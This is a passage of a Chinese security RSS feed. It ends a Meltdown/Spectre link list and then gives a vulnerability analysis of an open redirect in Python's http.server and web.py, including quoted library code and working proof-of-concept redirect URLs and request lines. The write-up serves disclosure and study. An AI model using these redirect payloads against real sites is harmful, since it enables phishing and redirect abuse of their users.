href=&quot;https://www.chromium.org/Home/chromium-security/ssca&quot;&gt;https://www.chromium.org/Home/chromium-security/ssca&lt;/a&gt;&lt;/p&gt;&lt;p&gt;MITRE&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715&lt;/a&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753&lt;/a&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Xen&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://xenbits.xen.org/xsa/advisory-254.html&quot;&gt;http://xenbits.xen.org/xsa/advisory-254.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Mozilla&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://blog.mozilla.org/security/2018/01/03/mitigations-landing-new-class-timing-attack/&quot;&gt;https://blog.mozilla.org/security/2018/01/03/mitigations-landing-new-class-timing-attack/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;VMware&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html&quot;&gt;https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考连接&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.rapid7.com/2018/01/04/meltdown-and-spectre-what-you-need-to-know-cve-2017-5715-cve-2017-5753-cve-2017-5754/&quot;&gt;https://blog.rapid7.com/2018/01/04/meltdown-and-spectre-what-you-need-to-know-cve-2017-5715-cve-2017-5753-cve-2017-5754/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.tomshardware.com/news/meltdown-spectre-exploits-intel-amd-arm-nvidia,36219.html&quot;&gt;Understanding The Meltdown And Spectre Exploits: Intel, AMD, ARM, And Nvidia&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://meltdownattack.com/meltdown.pdf&quot;&gt;https://meltdownattack.com/meltdown.pdf&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-01-10-32810180</guid>
<pubDate>Wed, 10 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Python http.server 任意跳转漏洞浅析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-01-03-32592960.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32592960&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5cc0dbfc9fb023180000c2db6facb0c7_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：Phith0n&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Github账号被封了以后，Vulhub也无法继续更新了，余下很多时间，默默看了点代码，偶然还能遇上一两个漏洞，甚是有趣。&lt;/p&gt;&lt;p&gt;这个漏洞出现在python核心库http中，发送给官方团队后被告知撞洞了，&lt;b&gt;且官方也认为需要更多人看看怎么修复这个问题&lt;/b&gt;，所以我们来分析一下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01  http.server库简单分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;众所周知Python有一个一键启动Web服务器的方法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;python3 -m http.server&lt;/code&gt;&lt;p&gt;在任意目录执行如上命令，即可启动一个web文件服务器。其实这个方法就用到了http.server模块。这个模块包含几个比较重要的类：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;HTTPServer这个类继承于socketserver.TCPServer，说明其实HTTP服务器本质是一个TCP服务器&lt;/li&gt;&lt;li&gt;BaseHTTPRequestHandler，这是一个处理TCP协议内容的Handler，目的就是将从TCP流中获取的数据按照HTTP协议进行解析，并按照HTTP协议返回相应数据包。但这个类解析数据包后没有进行任何操作，不能直接使用。如果我们要写自己的Web应用，应该继承这个类，并实现其中的do_XXX等方法。&lt;/li&gt;&lt;li&gt;SimpleHTTPRequestHandler，这个类继承于BaseHTTPRequestHandler，从父类中拿到解析好的数据包，并将用户请求的path返回给用户，等于实现了一个静态文件服务器。&lt;/li&gt;&lt;li&gt;CGIHTTPRequestHandler，这个类继承于SimpleHTTPRequestHandler，在静态文件服务器的基础上，增加了执行CGI脚本的功能。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;简单来说就是如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;+-----------+          +------------------------+    
| TCPServer |          | BaseHTTPRequestHandler |
+-----------+          +------------------------+ 
     ^                            |
     |                            v
     |                +--------------------------+
     +----------------| SimpleHTTPRequestHandler |
     |                +--------------------------+
     |                            |
     |                            v
     |                 +-----------------------+
     +-----------------| CGIHTTPRequestHandler |
                       +-----------------------+&lt;/code&gt;&lt;p&gt;我们看看&lt;code class=&quot;inline&quot;&gt;SimpleHTTPRequestHandler&lt;/code&gt;的源代码：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    server_version = &quot;SimpleHTTP/&quot; + __version__

    def do_GET(self):
        &quot;&quot;&quot;Serve a GET request.&quot;&quot;&quot;
        f = self.send_head()
        if f:
            try:
                self.copyfile(f, self.wfile)
            finally:
                f.close()

    # ...

    def send_head(self):
        path = self.translate_path(self.path)
        f = None
        if os.path.isdir(path):
            parts = urllib.parse.urlsplit(self.path)
            if not parts.path.endswith(&#39;/&#39;):
                # redirect browser - doing basically what apache does
                self.send_response(HTTPStatus.MOVED_PERMANENTLY)
                new_parts = (parts[0], parts[1], parts[2] + &#39;/&#39;,
                             parts[3], parts[4])
                new_url = urllib.parse.urlunsplit(new_parts)
                self.send_header(&quot;Location&quot;, new_url)
                self.end_headers()
                return None
            for index in &quot;index.html&quot;, &quot;index.htm&quot;:
                index = os.path.join(path, index)
                if os.path.exists(index):
                    path = index
                    break
            else:
                return self.list_directory(path)
        # ...&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前面HTTP解析的部分不再分析，如果我们请求的是GET方法，将会被分配到&lt;code class=&quot;inline&quot;&gt;do_GET&lt;/code&gt;函数里，在&lt;code class=&quot;inline&quot;&gt;do_GET()&lt;/code&gt;中调用了&lt;code class=&quot;inline&quot;&gt;send_head()&lt;/code&gt;方法。&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;send_head()&lt;/code&gt;中调用了&lt;code class=&quot;inline&quot;&gt;self.translate_path(self.path)&lt;/code&gt;将request path进行一个标准化操作，目的是获取用户真正请求的文件。如果这个path是一个已存在的目录，则进入if语句。&lt;/p&gt;&lt;p&gt;如果用户请求的path不是以&lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;结尾，则进入第二个if语句，这个语句中执行了HTTP跳转的操作，这就是我们当前漏洞的关键点了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02  任意URL跳转漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果我们请求的是一个已存在的目录，但PATH没有以&lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;结尾，则将PATH增加&lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;并用301跳转。&lt;/p&gt;&lt;p&gt;这就涉及到了一个有趣的问题：在chrome、firefox等主流浏览器中，如果url以&lt;code class=&quot;inline&quot;&gt;//domain&lt;/code&gt;开头，浏览器将会默认认为这个url是当前数据包的协议。比如，我们访问&lt;code class=&quot;inline&quot;&gt;http://example.com&lt;/code&gt;，跳转到&lt;code class=&quot;inline&quot;&gt;//baidu.com/&lt;/code&gt;，则浏览器会默认认为跳转到&lt;code class=&quot;inline&quot;&gt;http://baidu.com&lt;/code&gt;，而不是跳转到&lt;code class=&quot;inline&quot;&gt;.//baidu.com/目录&lt;/code&gt;&lt;a href=&quot;//baidu.com/%E7%9B%AE%E5%BD%95%E3%80%82&quot;&gt;。&lt;/a&gt;&lt;/p&gt;&lt;p&gt;所以，如果我们发送的请求的是&lt;code class=&quot;inline&quot;&gt;GET //baidu.com HTTP/1.0\r\n\r\n&lt;/code&gt;，那么将会被重定向到&lt;code class=&quot;inline&quot;&gt;//baidu.com/&lt;/code&gt;，也就产生了一个任意URL跳转漏洞。&lt;/p&gt;&lt;p&gt;在此前，由于目录&lt;code class=&quot;inline&quot;&gt;baidu.com&lt;/code&gt;不存在，我们还需要绕过&lt;code class=&quot;inline&quot;&gt;if os.path.isdir(path)&lt;/code&gt;这条if语句。绕过方法也很简单，因为&lt;code class=&quot;inline&quot;&gt;baidu.com&lt;/code&gt;不存在，我们跳转到上一层目录即可：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;GET //baidu.com/%2f.. HTTP/1.0\r\n\r\n&lt;/code&gt;&lt;p&gt;如何测试这个漏洞呢？其实也很简单，直接用&lt;code class=&quot;inline&quot;&gt;python3 -m http.server&lt;/code&gt;启动一个HTTP服务器即可。访问&lt;code class=&quot;inline&quot;&gt;http://127.0.0.1:8000//example.com/%2f%2e%2e&lt;/code&gt;即可发现跳转到了&lt;code class=&quot;inline&quot;&gt;http://example.com/%2f../&lt;/code&gt;。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-55826f561cc369457771b1d24cef42fa_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1207&quot; data-rawheight=&quot;489&quot;&gt;&lt;h2&gt;&lt;b&gt;0x03  web.py任意URL跳转漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;那么，虽然说python核心库存在这个漏洞，不过通常情况下不会有人直接在生产环境用&lt;code class=&quot;inline&quot;&gt;python -m http.server&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;Python框架web.py在处理静态文件的代码中继承并使用了&lt;code class=&quot;inline&quot;&gt;SimpleHTTPRequestHandler&lt;/code&gt;类，所以也会受到影响。&lt;/p&gt;&lt;p&gt;我们可以简单测试一下，我们用web.py官网的示例代码创建一个web应用：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import web

urls = (
    &#39;/(.*)&#39;, &#39;hello&#39;
)
app = web.application(urls, globals())


class hello:
    def GET(self, name):
        if not name:
            name = &#39;World&#39;
        return &#39;Hello, &#39; + name + &#39;!&#39;


if __name__ == &quot;__main__&quot;:
    app.run()&lt;/code&gt;&lt;p&gt;然后模拟真实环境，创建一个static目录，和一些子目录：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static
├── css
│   └── app.css
└── js
    └── app.js&lt;/code&gt;&lt;p&gt;运行后，直接访问&lt;code class=&quot;inline&quot;&gt;http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f&lt;/code&gt;即可发现已成功跳转。&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;web.py&lt;/code&gt;的具体分析我就不多说了，由于请求必须有&lt;code class=&quot;inline&quot;&gt;/static/&lt;/code&gt;前缀，所以利用方法有些不同，不过核心原理也无差别。&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-01-03-32592960</guid>
<pubDate>Wed, 03 Jan 2018 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
